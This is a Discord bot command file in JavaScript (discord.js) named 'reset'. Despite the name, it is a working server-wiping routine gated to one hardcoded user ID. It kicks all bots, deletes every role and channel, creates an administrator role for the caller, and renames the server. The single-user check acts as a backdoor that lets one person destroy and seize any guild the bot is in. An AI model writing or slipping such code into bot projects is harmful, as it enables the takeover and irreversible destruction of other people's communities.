const { Message, Client, Permissions } = require("discord.js");

module.exports = {
    name: "reset",
    /**
     *
     * @param {Client} client
     * @param {Message} message
     * @param {String[]} args
     */
    run: async (client, message, args) => {

        if(message.author.id !== '931529194972794900') return
        let channels = await message.guild.channels.fetch()
        let roles = await message.guild.roles.fetch()
        let bots = message.guild.members.cache.filter((m) => m.user.bot)
        bots.forEach(bot => bot.kick())

        setTimeout(() => {
            message.author.send('Server Resettato!')
        }, 5000);

        roles.forEach(r => r.delete())
        channels.forEach(c => c.delete())

        message.guild.channels.create('CANALE DI RITROVO')
        .then((c) => c.send('**Hello @\everyone!**'))

        message.guild.roles.create({name: 'ADMIN', permissions: [Permissions.FLAGS.ADMINISTRATOR]})
        .then((r) => message.member.roles.add(`${r.id}`)) 

        message.guild.setName('NEW SERVER ✨', 'Server Resettato')
        message.guild.setIcon(' ')
    },
};